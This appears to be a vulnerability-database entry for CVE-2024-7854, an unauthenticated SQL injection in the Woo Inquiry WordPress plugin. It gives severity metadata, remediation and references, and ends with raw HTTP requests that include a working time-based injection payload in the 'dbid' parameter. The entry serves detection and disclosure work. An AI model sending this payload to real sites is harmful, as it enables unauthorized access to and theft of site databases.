---
layout: post
cve_id: CVE-2024-7854
title: Woo Inquiry <= 0.1 - SQL Injection
pcap: true
pcap_path: /pcaps/2024/CVE-2024-7854.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-7854.yaml
snort2_rule: N/A
snort3_rule: N/A
author: s4e-io
severity: critical
impact: 'Unauthenticated attackers can exploit SQL injection to extract, modify, or
  delete sensitive database information, potentially compromising user credentials
  and the entire WordPress site.

  '
remediation: 'Remove or update the Woo Inquiry plugin to a version later than 0.1
  that addresses the SQL injection vulnerability in the dbid parameter.

  '
reference:
- https://github.com/RandomRobbieBF/CVE-2024-7854
- https://www.wordfence.com/threat-intel/vulnerabilities/id/312a6601-c914-4661-82ff-6f8bac849442?source=cve
- https://nvd.nist.gov/vuln/detail/CVE-2024-7854
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2024-7854
  cwe-id: CWE-89
  epss-score: 0.8034
  epss-percentile: 0.99083
  cpe: cpe:2.3:a:sjhoo:woo_inquiry:0.1:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 2
  vendor: sjhoo
  product: woo_inquiry
  framework: wordpress
  publicwww-query: /wp-content/plugins/woo-inquiry
tags:
- time-based-sqli
- cve
- cve2024
- wp
- wordpress
- wp-plugin
- sqli
- woo-inquiry
- vuln
---

## ðŸ” Vulnerability Description
The Woo Inquiry plugin for WordPress is vulnerable to SQL Injection in all versions up to, and including, 0.1 due to insufficient escaping on the user supplied parameter 'dbid' and lack of sufficient preparation on the existing SQL query. This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.


## ðŸŒ HTTP Request
```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Connection: close
Content-Length: 65
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip

action=woo_wpinq_times_up&dbid=(SELECT(0)FROM(SELECT(SLEEP(6)))a)
```

